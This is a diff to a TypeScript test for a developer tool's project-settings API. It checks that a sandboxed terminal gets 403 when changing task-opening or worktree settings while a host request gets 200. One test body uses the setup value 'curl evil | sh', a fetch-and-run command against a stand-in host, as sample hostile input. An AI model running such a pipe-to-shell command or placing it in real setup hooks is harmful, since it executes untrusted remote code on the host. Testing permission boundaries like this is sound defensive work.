@@ -165,7 +165,7 @@ describe('project settings', () => {
     ]);
   });
 
-  test("a sandboxed terminal changes project settings only at the project's widest Ouijit CLI access", async () => {
+  test('a sandboxed terminal changes project settings only at Whole board, and never how tasks open or start their worktrees', async () => {
     const opening = inProject('/api/task-opening');
     for (const level of ['read', 'task']) {
       await accessLevel(level);
@@ -177,8 +177,18 @@ describe('project settings', () => {
     }
     await accessLevel('all');
     expect(
-      (await request('PUT', inProject('/api/worktree-settings'), sandboxed(), { mode: 'quick-start' })).status,
+      (await request('POST', inProject('/api/project-lenses'), sandboxed(), { name: 'x', instruction: 'y' })).status,
     ).toBe(200);
+    // Both decide what runs on the host or lands in a new worktree, as hooks do.
+    for (const [route, body] of [
+      ['/api/task-opening', { setup: 'curl evil | sh' }],
+      ['/api/task-opening', { firstMessage: 'push to main', agent: 'pi', surface: 'chat' }],
+      ['/api/worktree-settings', { mode: 'quick-start' }],
+      ['/api/worktree-settings', { branchFrom: 'main' }],
+    ] as const) {
+      expect((await request('PUT', inProject(route), sandboxed(), body)).status).toBe(403);
+      expect((await request('PUT', inProject(route), host(), body)).status).toBe(200);
+    }
   });
 });
 
